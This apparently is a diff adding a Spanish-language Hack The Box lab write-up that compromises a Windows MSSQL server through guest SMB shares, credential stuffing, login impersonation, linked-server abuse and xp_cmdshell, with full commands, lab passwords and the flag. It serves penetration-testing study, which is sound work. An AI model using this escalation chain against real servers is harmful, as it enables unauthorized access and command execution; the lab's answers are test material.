@@ -320,3 +320,317 @@ nmap -p- (escaneo completo)
 (paralelo) dig AXFR → mapa de infraestructura interna
 (paralelo) ProFTPD 2121 → mod_copy activo (CVE-2015-3306, no explotado)
 ```
+
+---
+# Attacking Common Services - Hard
+
+The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.
+
+**IP:** 10.129.203.10  
+**OS:** Windows Server 2019 (Build 17763)  
+**Hostname:** WIN-HARD  
+**Dificultad:** Hard  
+**Módulo:** Attacking Common Services
+## Resumen ejecutivo
+
+Máquina Windows con cuatro servicios expuestos: MSRPC, SMB, MSSQL 2019 y RDP. El compromiso se logró encadenando cuatro técnicas del módulo de MSSQL:
+
+1. **SMB guest** → acceso de lectura al share `Home` → credenciales y usuarios.
+2. **Credential stuffing en MSSQL** → acceso como Fiona (guest en el motor).
+3. **Impersonación** (`EXECUTE AS LOGIN = 'john'`) → acceso a bases de datos restringidas.
+4. **Linked server abuse** → ejecución como `NT AUTHORITY\SYSTEM` → flag.
+
+La nota de John en el share SMB (`information.txt`) actuó como hoja de ruta del lab, revelando las tres técnicas configuradas: base de datos activa, linked server local e impersonación.
+
+**Flag:** `HTB{46u$!n9_l!nk3d_$3rv3r$}`
+## 1. Enumeración
+
+### Escaneo de puertos
+
+```
+sudo nmap -Pn -sV -sC -v 10.129.203.10 -T4 -oA hard
+```
+
+| Puerto | Servicio | Versión | Nota |
+|--------|----------|---------|------|
+| 135 | MSRPC | Windows RPC | Endpoint mapper (WMI/DCOM) |
+| 445 | SMB | Windows | **Signing no requerido** |
+| 1433 | MSSQL | **SQL Server 2019 15.00.2000.00 RTM** | Sin parches |
+| 3389 | RDP | Windows Server 2019 (10.0.17763) | Host: WIN-HARD |
+
+**Hallazgos del escaneo:**
+- **SMB signing no requerido** (`signing:False`) → NTLM relay potencial.
+- **MSSQL 2019 RTM** (sin Service Pack) → versión base sin parches.
+- Instancia MSSQL: `WIN-HARD\SQLEXPRESS` (nombrada, no default).
+- No hay puertos web, FTP ni SSH — superficie acotada a SMB + MSSQL + RDP.
+## 2. Enumeración SMB
+
+### Null session — denegada
+```
+nxc smb 10.129.203.10 -u '' -p '' --shares
+# STATUS_ACCESS_DENIED
+```
+
+### Guest session — exitosa
+```
+nxc smb 10.129.203.10 -u 'guest' -p '' --shares
+```
+
+```
+Share     Permissions   Remark
+-----     -----------   ------
+ADMIN$                  Remote Admin
+C$                      Default share
+Home      READ          
+IPC$      READ          Remote IPC
+```
+
+**Share `Home` con READ** — accesible como guest sin contraseña.
+
+### Exploración del share Home
+
+```
+smbclient //10.129.203.10/Home -U guest
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> mget *
+```
+
+Estructura del share:
+```
+Home/
+  HR/
+  IT/
+    Fiona/
+      creds.txt
+    John/
+      information.txt
+      secrets.txt
+    Simon/
+      random.txt
+  OPS/
+  Projects/
+```
+
+**Usuarios confirmados:** `Fiona`, `John`, `Simon`
+
+### Archivos encontrados
+
+**`IT/John/information.txt`** — hoja de ruta del lab:
+```
+To do:
+- Keep testing with the database.
+- Create a local linked server.
+- Simulate Impersonation.
+```
+
+**`IT/Fiona/creds.txt`:**
+```
+kAkd03SA@#!
+48Ns72!bns74@S84NNNSl
+SecurePassword!
+Password123!
+SecureLocationforPasswordsd123!!
+```
+
+**`IT/John/secrets.txt`:**
+```
+1234567
+(DK02ka-dsaldS
+Inlanefreight2022
+Inlanefreight2022!
+TestingDB123
+```
+
+**`IT/Simon/random.txt`:**
+```
+(k20ASD10934kadA
+KDIlalsa9020$
+JT9ads02lasSA@
+Kaksd032klasdA#
+LKads9kasd0-@%
+```
+## 3. Acceso MSSQL — Credential Stuffing
+
+Con los tres usuarios y 15 passwords candidatas, se ataca el MSSQL:
+
+```
+nxc mssql 10.129.203.10 -u fiona -p IT/Fiona/creds.txt
+```
+
+```
+[+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl
+```
+
+Credencial válida: **`fiona : 48Ns72!bns74@S84NNNSl`**
+
+Conexión con impacket-mssqlclient:
+```
+impacket-mssqlclient fiona:'48Ns72!bns74@S84NNNSl'@10.129.203.10
+```
+
+Fiona entra como **`guest`** en el motor (prompt: `guest@master`) — el rol más bajo posible.
+
+### Enumeración de bases de datos
+
+```sql
+SELECT name FROM master.dbo.sysdatabases
+```
+```
+master, tempdb, model, msdb, TestingDB, TestAppDB
+```
+
+`TestAppDB` es inaccesible para Fiona (guest):
+```
+ERROR: The server principal "WIN-HARD\Fiona" is not able to access the database "TestAppDB"
+```
+## 4. Escalada MSSQL — Impersonación
+
+### Identificar usuarios impersonables
+
+```sql
+SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+```
+```
+john
+simon
+```
+
+### Verificar privilegios de john y simon
+
+Ninguno es sysadmin (`IS_SRVROLEMEMBER('sysadmin') = 0`), pero con simon impersonado se accede a `TestAppDB`:
+
+```sql
+EXECUTE AS LOGIN = 'simon'
+SELECT table_name FROM TestAppDB.INFORMATION_SCHEMA.TABLES
+```
+```
+tb_users
+```
+
+```sql
+SELECT * FROM TestAppDB.dbo.tb_users
+```
+```
+username   password          privileges
+--------   --------          ----------
+patric     Testuser123!      user
+julio      Testadmin123!     admin
+```
+
+### Intento de RDP con credenciales obtenidas
+
+Ambas cuentas (`julio` y `patric`) fallan con:
+```
+ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED [0x0002000F]
+```
+Las contraseñas de las cuentas Windows están expiradas — RDP directo no es el vector.
+## 5. Escalada MSSQL — Linked Server Abuse
+
+### Identificar linked servers
+
+```sql
+SELECT srvname, isremote FROM sysservers
+```
+```
+srvname                   isremote
+-----------------------   --------
+WINSRV02\SQLEXPRESS       1          (servidor remoto)
+LOCAL.TEST.LINKED.SRV     0          (linked server local)
+```
+
+`LOCAL.TEST.LINKED.SRV` (`isremote = 0`) es un linked server en la misma máquina — el que mencionaba la nota de John.
+
+### Fiona directo al linked server — falla
+
+```sql
+EXECUTE('SELECT SYSTEM_USER') AT [LOCAL.TEST.LINKED.SRV]
+-- ERROR: Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'
+```
+
+Fiona (guest) es mapeada a Anonymous Logon — sin acceso.
+
+### John impersonado + linked server — éxito
+
+```sql
+EXECUTE AS LOGIN = 'john'
+EXECUTE('SELECT @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+```
+```
+1   1   1   1
+```
+
+**`is_srvrolemember('sysadmin') = 1`** — el linked server corre como sysadmin.
+
+**Cadena de escalada:**
+```
+Fiona (guest) → IMPERSONATE john → john tiene acceso al linked server → linked server = sysadmin
+```
+## 6. RCE vía xp_cmdshell a través del Linked Server
+
+### Habilitar xp_cmdshell
+
+> [!Important]
+> `sp_configure` debe ejecutarse `AT [LOCAL.TEST.LINKED.SRV]`, no en la instancia local donde john es guest. Ejecutarlo directo da `User does not have permission`.
+
+```sql
+EXECUTE('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV]
+EXECUTE('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV]
+```
+
+### Verificar identidad
+
+```sql
+EXECUTE('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
+```
+```
+nt authority\system
+```
+
+RCE como **`NT AUTHORITY\SYSTEM`** — el nivel más alto posible.
+
+### Leer la flag
+
+```sql
+EXECUTE('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
+```
+```
+HTB{46u$!n9_l!nk3d_$3rv3r$}
+```
+## Cadena de ataque resumida
+
+```
+SMB guest → Home share (READ)
+  → creds.txt / secrets.txt / random.txt + usuarios (Fiona, John, Simon)
+  → information.txt (hoja de ruta: DB + linked server + impersonation)
+  
+Credential stuffing MSSQL
+  → fiona:48Ns72!bns74@S84NNNSl → guest@master
+
+Impersonación (EXECUTE AS LOGIN)
+  → simon → TestAppDB → tb_users → julio:Testadmin123! / patric:Testuser123!
+  → RDP con julio/patric → ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED (bloqueado)
+
+Impersonación + Linked Server
+  → john → LOCAL.TEST.LINKED.SRV → sysadmin
+  → sp_configure + xp_cmdshell AT [LOCAL.TEST.LINKED.SRV]
+  → whoami = NT AUTHORITY\SYSTEM
+  → flag
+```
+## Hallazgos de seguridad
+
+- **SMB guest habilitado** — acceso de lectura sin credenciales a un share con información sensible.
+- **Credenciales en texto plano en SMB** — archivos `creds.txt`, `secrets.txt`, `random.txt` con passwords reales expuestos en un share accesible.
+- **Hoja de ruta del atacante en SMB** — `information.txt` revela la arquitectura interna (linked server, impersonación).
+- **Usuario MSSQL (Fiona) con permiso IMPERSONATE sobre otras cuentas** — escalada de guest a sysadmin vía impersonación + linked server.
+- **Linked server local configurado con cuenta sysadmin** — `LOCAL.TEST.LINKED.SRV` corre como `NT AUTHORITY\SYSTEM`, habilitando escalada desde cualquier usuario con acceso al linked server.
+- **xp_cmdshell habilitado vía linked server** — permite ejecución de comandos del SO como SYSTEM.
+- **Contraseñas expiradas en cuentas Windows** (julio, patric) — accounts mal gestionadas; en este caso impidieron el vector RDP pero son un hallazgo de gestión de identidades.
+- **SMB signing no requerido** — habilita ataques NTLM relay (no fue necesario explotar en este caso).
+
+## Lecciones aprendidas
+
+- **`GO` no es un comando SQL** — es un separador de lotes del cliente (sqlcmd/ssms). En impacket-mssqlclient no existe; los comandos se ejecutan directamente.
+- **Todo lo que requiera privilegios del linked server debe ir `AT [nombre]`** — `sp_configure` directo cae en la instancia local donde el usuario es guest.
+- **El linked server hereda la identidad de su configuración**, no la del usuario que lo invoca — por eso es un vector de escalada clásico.
+- **La impersonación sola no da sysadmin**, pero combinada con un linked server configurado con cuenta privilegiada sí lo hace — es el encadenamiento que hace esta técnica poderosa.
